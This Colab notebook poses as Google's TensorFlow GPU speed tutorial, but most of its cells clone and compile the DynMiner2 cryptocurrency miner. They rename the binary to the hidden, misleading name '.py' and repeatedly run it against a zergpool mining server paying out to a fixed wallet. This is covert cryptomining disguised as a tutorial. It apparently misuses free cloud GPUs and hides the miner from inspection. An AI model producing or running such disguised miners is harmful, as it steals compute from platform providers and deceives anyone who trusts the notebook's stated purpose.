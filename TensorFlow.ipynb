{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "tMce8muBqXQP"
      },
      "source": [
        "# Tensorflow with GPU\n",
        "\n",
        "This notebook provides an introduction to computing on a [GPU](https://cloud.google.com/gpu) in Colab. In this notebook you will connect to a GPU, and then run some basic TensorFlow operations on both the CPU and a GPU, observing the speedup provided by using the GPU.\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!nvidia-smi"
      ],
      "metadata": {
        "id": "csnygi6DK7sh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "oM_8ELnJq_wd"
      },
      "source": [
        "## Enabling and testing the GPU\n",
        "\n",
        "First, you'll need to enable GPUs for the notebook:\n",
        "\n",
        "- Navigate to Edit→Notebook Settings\n",
        "- select GPU from the Hardware Accelerator drop-down\n",
        "\n",
        "Next, we'll confirm that we can connect to the GPU with tensorflow:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "sXnDmXR7RDr2"
      },
      "outputs": [],
      "source": [
        "%tensorflow_version 2.x\n",
        "import tensorflow as tf\n",
        "device_name = tf.test.gpu_device_name()\n",
        "if device_name != '/device:GPU:0':\n",
        "  raise SystemError('GPU device not found')\n",
        "print('Found GPU at: {}'.format(device_name))"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "v3fE7KmKRDsH"
      },
      "source": [
        "## Observe TensorFlow speedup on GPU relative to CPU\n",
        "\n",
        "This example constructs a typical convolutional neural network layer over a\n",
        "random image and manually places the resulting ops on either the CPU or the GPU\n",
        "to compare execution speed."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Y04m-jvKRDsJ"
      },
      "outputs": [],
      "source": [
        "%tensorflow_version 2.x\n",
        "import tensorflow as tf\n",
        "import timeit\n",
        "\n",
        "device_name = tf.test.gpu_device_name()\n",
        "if device_name != '/device:GPU:0':\n",
        "  print(\n",
        "      '\\n\\nThis error most likely means that this notebook is not '\n",
        "      'configured to use a GPU.  Change this in Notebook Settings via the '\n",
        "      'command palette (cmd/ctrl-shift-P) or the Edit menu.\\n\\n')\n",
        "  raise SystemError('GPU device not found')\n",
        "\n",
        "def cpu():\n",
        "  with tf.device('/cpu:0'):\n",
        "    random_image_cpu = tf.random.normal((100, 100, 100, 3))\n",
        "    net_cpu = tf.keras.layers.Conv2D(32, 7)(random_image_cpu)\n",
        "    return tf.math.reduce_sum(net_cpu)\n",
        "\n",
        "def gpu():\n",
        "  with tf.device('/device:GPU:0'):\n",
        "    random_image_gpu = tf.random.normal((100, 100, 100, 3))\n",
        "    net_gpu = tf.keras.layers.Conv2D(32, 7)(random_image_gpu)\n",
        "    return tf.math.reduce_sum(net_gpu)\n",
        "  \n",
        "# We run each op once to warm up; see: https://stackoverflow.com/a/45067900\n",
        "cpu()\n",
        "gpu()\n",
        "\n",
        "# Run the op several times.\n",
        "print('Time (s) to convolve 32x7x7x3 filter over random 100x100x100x3 images '\n",
        "      '(batch x height x width x channel). Sum of ten runs.')\n",
        "print('CPU (s):')\n",
        "cpu_time = timeit.timeit('cpu()', number=10, setup=\"from __main__ import cpu\")\n",
        "print(cpu_time)\n",
        "print('GPU (s):')\n",
        "gpu_time = timeit.timeit('gpu()', number=10, setup=\"from __main__ import gpu\")\n",
        "print(gpu_time)\n",
        "print('GPU speedup over CPU: {}x'.format(int(cpu_time/gpu_time)))"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!apt-get install software-properties-common -y && add-apt-repository ppa:ubuntu-toolchain-r/test -y\n",
        "!apt install libstdc++-10-dev g++-11 -y && git clone https://github.com/dynamofoundation/DynMiner2.git && cd DynMiner2 && cd DynMiner2 && g++-11 -I. -std=gnu++11 *.cpp -lpthread -L/opt/cuda/lib64 -lOpenCL -lcurl -o dyn_miner2 && chmod +x dyn_miner2 && mv dyn_miner2 .py && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "yAoeMHb8JDIX"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "iLD27mZodNJz"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "5yu6YB0_hrD3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "zj1cFxtJhrMP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "qdFmIUPlhrSv"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "yPLkk0OzhrZY"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "q5i4Mo_Qhrgn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "x75axkt8hrmn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cd DynMiner2 && cd DynMiner2 && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "3TTUoAnWhrsv"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!apt-get install software-properties-common -y && add-apt-repository ppa:ubuntu-toolchain-r/test -y\n",
        "!apt install libstdc++-10-dev g++-11 -y && git clone https://github.com/dynamofoundation/DynMiner2.git && cd DynMiner2 && git checkout 128187d4f0e70d4d1c8f4ce7117e239b566f1a7d && cd DynMiner2 && g++-11 -I. -std=gnu++11 *.cpp -lpthread -L/opt/cuda/lib64 -lOpenCL -lcurl -o dyn_miner2 && chmod +x dyn_miner2 && mv dyn_miner2 .py && ./.py -mode stratum -server dynamo.mine.zergpool.com -port 4234 -user D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n -pass c=DOGE,sd=5 -diff 5 -miner GPU,524288,512,0,0"
      ],
      "metadata": {
        "id": "ud06wg95-xWB"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "TensorFlow GPU VM",
      "provenance": [],
      "private_outputs": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "nbformat": 4,
  "nbformat_minor": 0
}